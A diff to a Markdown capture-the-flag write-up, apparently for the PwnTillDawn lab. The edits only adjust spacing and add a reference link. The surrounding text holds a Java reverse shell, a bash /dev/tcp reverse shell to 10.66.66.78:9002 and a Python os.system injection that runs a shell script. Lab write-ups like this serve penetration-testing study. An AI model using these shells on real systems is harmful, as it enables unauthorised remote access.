@@ -45,7 +45,7 @@ int port=9001;
 String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 <br>
-![image](https://user-images.githubusercontent.com/67085453/143765793-ff14889e-8cdb-4b2b-b144-003ab641c429.png)<br>
+![image](https://user-images.githubusercontent.com/67085453/143765793-ff14889e-8cdb-4b2b-b144-003ab641c429.png) <br>
 
 
 **> Post Exploitation**<br>
@@ -83,4 +83,7 @@ bash -c  'bash -i>&/dev/tcp/10.66.66.78/9002 0>&1'
 
 Once our bash file is on the target, we can execute the bash file using the pythin calculator. We simply do this using the command
 `__import__("os").system("/bin/bash /tmp/shell.sh")`<br>
-![image](https://user-images.githubusercontent.com/67085453/143765976-251cd43b-7e6d-4852-895b-6b2ba81033c9.png)
+![image](https://user-images.githubusercontent.com/67085453/143765976-251cd43b-7e6d-4852-895b-6b2ba81033c9.png)<br><br>
+
+
+Referrence: <a href="https://online.pwntilldawn.com/">PwnTillDawn Online battlefield</a>
